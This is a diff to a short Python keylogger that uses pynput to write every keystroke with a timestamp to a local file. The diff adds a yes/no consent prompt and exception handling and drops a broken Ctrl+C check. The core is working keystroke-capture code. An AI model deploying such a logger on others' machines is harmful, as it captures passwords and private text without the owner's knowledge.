@@ -1,16 +1,23 @@
 from pynput.keyboard import Key, Listener
 import logging
-import sys
 
 logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format="%(asctime)s - %(message)s")
 
 def on_press(key):
     logging.info(str(key))
 
-    # Check for Ctrl+C combination
-    if key == Key.ctrl_l and key.char == 'c':
-        print("Ctrl+C pressed. Exiting.")
-        sys.exit()
+try:
+    # Ask for user's permission
+    confirmation = input("Do you want to start the keylogger? (yes/no): ").lower()
 
-with Listener(on_press=on_press) as listener:
-    listener.join()
+    if confirmation == "yes":
+        with Listener(on_press=on_press) as listener:
+            print("Keylogger started. Press Ctrl+C to exit.")
+            listener.join()
+    else:
+        print("Keylogger not started. Exiting.")
+
+except KeyboardInterrupt:
+    print("Ctrl+C pressed. Exiting.")
+except Exception as e:
+    print(f"An error occurred: {e}")
